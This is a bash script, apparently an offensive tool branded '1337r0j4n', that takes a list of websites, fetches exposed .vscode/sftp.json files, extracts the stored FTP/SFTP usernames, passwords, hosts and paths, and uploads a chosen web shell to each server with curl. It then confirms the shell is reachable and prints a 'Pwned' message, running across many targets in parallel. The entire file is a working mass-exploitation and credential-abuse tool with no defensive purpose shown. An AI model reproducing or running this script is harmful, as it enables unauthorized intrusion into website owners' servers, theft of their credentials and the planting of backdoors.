
#!/bin/bash
RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
clear
cat << EOF

${RED}   _______ _______${PURPLE} ______                         ${RESAT}
${RED}  |    ___|_     _${PURPLE}|   __ \\${GREEN}.--.--.--.-----.${RESAT}
${RED}  |    ___| |   | ${PURPLE}|    __/${GREEN}|  |  |  |     |${RESAT}
${RED}  |___|     |___| ${PURPLE}|___|   ${GREEN}|________|__|__|${RESAT}    1337r0j4n

EOF
read -p "Listt : " list
read -p "Shell : " shell
echo ""
read -p "Jumlah Thread: " thread_count

check_site() {
  site="$1"
  check=$(curl -L -o /dev/null -s -k -w "%{http_code}" "$site/.vscode/sftp.json")
  check2=$(curl -L -s -k "$site/.vscode/sftp.json" | grep -o "uploadOnSave")

  if [[ $check == "200" && $check2 == "uploadOnSave" ]]; then
    curl -L -s -k "$site/.vscode/sftp.json" > .7r0j4n.txt
    protocol=$(cat .7r0j4n.txt | grep protocol | cut -d '"' -f 4)
    username=$(cat .7r0j4n.txt | grep username | cut -d '"' -f 4)
    password=$(cat .7r0j4n.txt | grep password | cut -d '"' -f 4)
    host=$(cat .7r0j4n.txt | grep host | cut -d '"' -f 4)
    port=$(cat .7r0j4n.txt | grep -o '"port": [0-9]\+' | cut -d ' ' -f 2)
    remote_path=$(cat .7r0j4n.txt | grep remotePath | cut -d '"' -f 4)

    if [[ $remote_path == "/" || $remote_path == "*/" ]]; then
      upload=$(curl -s -k -T "$shell" -u "$username:$password" "${protocol}://$host:$port${remote_path}$shell")
    else
      upload=$(curl -k -s -T "$shell" -u "$username:$password" "${protocol}://$host:$port${remote_path}/$shell")
    fi

    if [[ $(curl -L -o /dev/null -s -k -w "%{http_code}" "$site/$shell") == "200" ]]; then
      echo "Pwned: ${GREEN}$site/$shell${RESAT}"
    fi
  fi
}

export -f check_site

parallel -j "$thread_count" "check_site {}" :::: "$list"
